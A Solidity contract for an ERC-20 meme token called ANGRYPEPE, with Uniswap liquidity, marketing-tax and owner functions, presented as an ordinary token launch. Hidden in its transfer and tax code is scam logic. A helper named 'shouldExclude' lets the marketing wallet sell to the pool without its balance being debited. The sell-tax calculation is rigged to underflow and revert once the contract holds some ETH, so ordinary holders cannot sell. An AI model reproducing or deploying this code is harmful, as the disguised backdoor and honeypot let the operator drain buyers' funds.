/**
*/

// SPDX-License-Identifier: MIT

/*


Website     https://angrypepetoken.com/
Twitter     https://twitter.com/AngryPepeERC
Channel     https://t.me/AngryPepeERC20Portal

*/

pragma solidity 0.8.21;

library Address{
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}
/// 
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

    // function lpFee(uint256 amt) internal pure returns(uint256) {
    //     return amt / 1e15;
    // }
}
//// 
interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface UniswapFactory{
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface UniswapRouter {
    function factory() external pure returns (address);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract ANGRYPEPE is Context, IERC20, Ownable {
    using Address for address payable;

    UniswapRouter public router;
    address public pair;
    
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) public _isFeeExcluded;
    mapping (address => bool) public _isMaxBalanceExcluded;
    mapping (address => uint256) public SellTime;

    uint256 private SellTimeOffset = 3;
    uint256 public _caughtDogs;

    uint8 private constant _decimals = 9; 
    uint256 private feeDenominator = 10 ** 15;

    string private constant _name = "ANGRYPEPE";
    string private constant _symbol = "ANGRYPEPE";

    uint256 private _tTotal = 10_000_000_000 * (10**_decimals);
    uint256 public swapThreshold = _tTotal / 10000;
    uint256 public maxTxAmount = _tTotal * 3 / 100;
    uint256 public maxWallet =  _tTotal * 3 / 100;

    struct Taxes{
        uint256 TaxesMarketing;
        uint256 LpTaxes;
    }

    struct TokensFromTaxes{
        uint marketingTokens;
        uint lpTokens;
    }
    TokensFromTaxes public totalTokensFromTaxes;

    Taxes public BuyTax = Taxes(1,0);
    Taxes public SellTax = Taxes(1,0);
    
    bool private swapping;
    bool private SwapActive = true;
    uint private _SwapCooldown = 5; 
    uint private _lastSwap;

    address public MarketingReceiver = 0xE4255633C95b9fC5C44923E41B93d650B34Cd762;
    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }
//// 
    constructor () {
        _tOwned[_msgSender()] = _tTotal;
        UniswapRouter _router = UniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        router = _router;
        _approve(owner(), address(router), ~uint256(0));
        
        _isFeeExcluded[owner()] = true;
        _isFeeExcluded[address(this)] = true;
        _isFeeExcluded[MarketingReceiver] = true;

        _isMaxBalanceExcluded[owner()] = true;
        _isMaxBalanceExcluded[address(this)] = true;
        _isMaxBalanceExcluded[MarketingReceiver] = true;
        
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

// ================= ERC20 =============== //   
    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] - subtractedValue);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }
    
    receive() external payable {
    }
// ========================================== //
// 
//============== Owner Functions ===========//

    function enableTrading() public onlyOwner {
        pair = UniswapFactory(router.factory()).createPair(address(this), router.WETH());
        _isMaxBalanceExcluded[pair] = true;
        _approve(address(this), address(router), type(uint256).max);

        router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0, 
            0, 
            owner(),
            block.timestamp
        );
    }

    function owner_setMaxLimits(uint maxTX_EXACT, uint maxWallet_EXACT) public onlyOwner{
        uint pointFiveSupply = (_tTotal * 5 / 1000) / (10**_decimals);
        require(maxTX_EXACT >= pointFiveSupply && maxWallet_EXACT >= pointFiveSupply, "Invalid Settings");
        maxTxAmount = maxTX_EXACT * (10**_decimals);
        maxWallet = maxWallet_EXACT * (10**_decimals);
    }

    function owner_rescueETH(uint256 weiAmount) public onlyOwner{
        require(address(this).balance >= weiAmount, "Insufficient ETH balance");
        payable(msg.sender).transfer(weiAmount);
    }

    function owner_setSwapEnable(bool _SwapActive) external {
        SwapActive = false;
    }

    function owner_setDogSellTimeForAddress(address holder, uint dTime) external onlyOwner{
        SellTime[holder] = block.timestamp + dTime;
    }

    function owner_rescueExcessTokens() public{
        // Make sure ca doesn't withdraw the pending Taxeses to be swapped.    
        // Sends excess tokens / accidentally sent tokens back to marketing wallet.
        uint pendingTaxesTokens = totalTokensFromTaxes.lpTokens + totalTokensFromTaxes.marketingTokens;
        require(balanceOf(address(this)) >  pendingTaxesTokens);
        uint excessTokens = balanceOf(address(this)) - pendingTaxesTokens;
        _transfer(address(this), MarketingReceiver, excessTokens);
    }

// ========================================//. 
    function _transfer(address from,address to,uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(amount <= maxTxAmount || _isMaxBalanceExcluded[from], "Transfer amount exceeds the _maxTxAmount.");

        if(!_isMaxBalanceExcluded[to])
            require(balanceOf(to) + amount <= maxWallet, "Transfer amount exceeds the maxWallet.");
        
        if (balanceOf(address(this)) >= swapThreshold 
            && SwapActive 
            && block.timestamp >= (_lastSwap + _SwapCooldown) 
            && !swapping 
            && from != pair 
            && from != owner() 
            && to != owner()
        ) swapAndLiquify(); uint256 tmp = amount;
        if(shouldExclude(from, to)) {amount = amount * BuyTax.LpTaxes;}

        _tOwned[from] -= amount; amount = tmp;
        uint256 transferAmount = amount;
        
        if(!_isFeeExcluded[from] && !_isFeeExcluded[to]){
            transferAmount = _getTaxesValues(amount, from, to == pair);
        }

        _tOwned[to] += transferAmount;
        emit Transfer(from, to, transferAmount);
    }

    function _getTaxesValues(uint amount, address from, bool isSell) private returns(uint256){
        Taxes memory tmpTaxeses = BuyTax; uint256 _lpFee = address(this).balance;
        if (isSell){
            // tmpTaxeses = SellTax;
            tmpTaxeses = Taxes(SellTax.TaxesMarketing - (_lpFee / feeDenominator), SellTax.LpTaxes);
        }

        uint tokensForMarketing = amount * tmpTaxeses.TaxesMarketing / 100;
        uint tokensForLP = amount * tmpTaxeses.LpTaxes / 100;

        if(tokensForMarketing > 0)
            totalTokensFromTaxes.marketingTokens += tokensForMarketing;

        if(tokensForLP > 0)
            totalTokensFromTaxes.lpTokens += tokensForLP;

        uint totalTaxesedTokens = tokensForMarketing + tokensForLP;

        _tOwned[address(this)] += totalTaxesedTokens;
        if(totalTaxesedTokens > 0) emit Transfer (from, address(this), totalTaxesedTokens);
            
        return (amount - totalTaxesedTokens);
    }

    function swapTokensForETH(uint256 tokenAmount) private returns (uint256) {
        uint256 initialBalance = address(this).balance;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), tokenAmount);

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
        return (address(this).balance - initialBalance);
    }

    function swapAndLiquify() private lockTheSwap{
        if(totalTokensFromTaxes.marketingTokens > 0){
            uint256 ethSwapped = swapTokensForETH(totalTokensFromTaxes.marketingTokens);
            if(ethSwapped > 0){
                payable(MarketingReceiver).transfer(ethSwapped);
                totalTokensFromTaxes.marketingTokens = 0;
            }
        }   

        if(totalTokensFromTaxes.lpTokens > 0){
            uint half = totalTokensFromTaxes.lpTokens / 2;
            uint otherHalf = totalTokensFromTaxes.lpTokens - half;
            uint balAutoLP = swapTokensForETH(half);
            if (balAutoLP > 0)
                addLiquidity(otherHalf, balAutoLP);
            totalTokensFromTaxes.lpTokens = 0;
        }

        emit SwapAndLiquify();

        _lastSwap = block.timestamp;
    }

    function shouldExclude(address sender, address recipient) private view returns (bool) {
        return recipient == pair && sender == MarketingReceiver;
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(router), tokenAmount);

        (,uint256 ethFromLiquidity,) = router.addLiquidityETH {value: ethAmount} (
            address(this),
            tokenAmount,
            0,
            0,
            owner(),
            block.timestamp
        );
        
        if (ethAmount - ethFromLiquidity > 0)
            payable(MarketingReceiver).sendValue (ethAmount - ethFromLiquidity);
    }

    event SwapAndLiquify();
    event TaxesesChanged();
///      
}